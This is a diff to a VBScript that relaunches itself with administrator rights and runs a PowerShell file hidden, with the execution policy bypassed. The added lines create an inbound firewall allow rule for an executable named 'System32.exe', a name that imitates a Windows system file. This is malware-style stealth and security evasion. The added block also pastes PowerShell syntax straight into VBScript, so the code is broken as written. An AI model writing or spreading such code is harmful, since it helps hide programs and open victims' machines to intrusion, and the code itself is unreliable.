@@ -36,6 +36,7 @@ objShortcut.TargetPath = strTargetPath
 objShortcut.Save
 
 ' Rest of your existing code...
+
 If WScript.Arguments.Count = 0 Then
   Set ObjShell = CreateObject("Shell.Application")
   ObjShell.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ Run", , "runas", 1
@@ -49,4 +50,22 @@ Else
   Dim cmd
   cmd = "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " & outFile
   WshShell.Run cmd, 0
+  
+  ' PowerShell code to add an app through Windows Defender Firewall
+  $AppName = "System32.exe"
+  $AppPath = scriptPath & "System32.exe"
+
+  # Check if the app is already in the allowed list
+  $ExistingRule = Get-NetFirewallRule | Where-Object { $_.DisplayName -eq $AppName }
+  if ($ExistingRule) {
+      # The app is already allowed through the firewall.
+  } else {
+      # Create a new firewall rule to allow the app
+      $NewRule = New-NetFirewallRule -DisplayName $AppName -Direction Inbound -Program $AppPath -Action Allow
+      if ($NewRule) {
+          # The app has been successfully allowed through the firewall.
+      } else {
+          # Failed to add the app to the firewall exceptions.
+      }
+  }
 End If
